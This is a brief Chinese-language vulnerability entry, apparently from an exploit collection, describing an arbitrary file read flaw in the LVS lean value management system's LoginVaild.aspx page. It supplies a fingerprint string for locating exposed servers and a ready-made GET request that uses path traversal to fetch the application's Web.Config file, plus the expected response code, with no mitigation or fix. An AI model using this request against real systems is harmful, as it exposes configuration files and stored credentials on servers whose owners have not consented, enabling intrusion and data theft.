# LVS精益价值管理系统LoginVaild.aspx存在任意文件读取漏洞

LVS ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"`
- **请求**：`GET /Business/LoginVaild.aspx?p=UploadFile/../Web.Config HTTP/1.1`
- **响应特征**：200